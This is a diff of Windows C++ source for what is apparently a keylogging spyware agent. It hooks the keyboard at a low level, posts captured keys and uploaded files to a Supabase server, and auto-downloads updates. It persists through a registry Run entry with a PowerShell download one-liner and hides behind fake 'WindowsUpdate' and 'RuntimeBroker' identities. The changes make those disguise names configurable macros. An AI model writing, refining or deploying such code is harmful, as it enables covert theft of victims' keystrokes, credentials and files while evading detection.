@@ -302,7 +302,7 @@ static void LogMsg(const std::string& msg) {
 // responsible for closing nothing — all HINTERNET handles are cleaned up here.
 // Returns true on HTTP success (any status code), with the body in `response`.
 static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::string& body, std::string& response) {
-    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
 
     WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
@@ -368,7 +368,7 @@ static bool PostKeys(const std::string& json) {
 // GET a Supabase path and return the body as a string (no apikey needed for
 // public Storage objects, but harmless to send anyway).
 static bool HttpGetToString(const wchar_t* path, std::string& response) {
-    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
     WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
     HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
@@ -395,7 +395,7 @@ static bool HttpGetToString(const wchar_t* path, std::string& response) {
 // Download a Supabase Storage object to a local file. Used by the auto-updater
 // to fetch the new RuntimeBroker.exe. 15s timeouts (large binary, may be slow).
 static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
-    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
     WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
     HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
@@ -943,7 +943,7 @@ static bool UploadToStorage(const std::string& localPath, const std::string& sto
     if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) { delete[] buf; CloseHandle(hFile); return false; }
     CloseHandle(hFile);
 
-    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) { delete[] buf; return false; }
     WinHttpSetTimeouts(hSession, 30000, 30000, 30000, 30000);
     HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
@@ -2449,7 +2449,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+#ifndef NETPEN_REGKEY
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
+#endif
 
 static void EnsureStartupEntry();
 static void CreateStartupFolderEntry();
@@ -2574,7 +2576,9 @@ static std::string Base64Encode(const BYTE* data, DWORD size) {
     return result;
 }
 
+#ifndef NETPEN_REGKEY
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
+#endif
 
 // Set up both the NETPEN_REGKEY marker and the HKCU\Run entry with a
 // PowerShell one-liner that downloads the agent from Netlify and starts it.
@@ -2665,14 +2669,14 @@ static int RunChild(HINSTANCE hInstance) {
     wc.cbSize = sizeof(WNDCLASSEXW);
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInstance;
-    wc.lpszClassName = L"RuntimeBrokerHiddenWindow";
+    wc.lpszClassName = AGENT_CLASS;
     if (!RegisterClassExW(&wc)) return 1;
 
     Gdiplus::GdiplusStartupInput gdiInput;
     ULONG_PTR gdiToken;
     Gdiplus::GdiplusStartup(&gdiToken, &gdiInput, NULL);
 
-    g_hwnd = CreateWindowExW(0, L"RuntimeBrokerHiddenWindow", L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
+    g_hwnd = CreateWindowExW(0, AGENT_CLASS, L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
     if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }
 
     g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
@@ -2720,7 +2724,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
         return RunChild(hInstance);
     }
 
-    CreateMutexW(NULL, TRUE, L"RuntimeBroker_Instance");
+    CreateMutexW(NULL, TRUE, AGENT_MUTEX);
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
 
     char hostname[256] = {0};
@@ -2796,3 +2800,4 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
 
 int _s2c82aaaa886e49b28794499e1fb8d69c(void){return 0;}
+int _s36e3d02fe91a4a1aa99ed29479298874(void){return 0;}
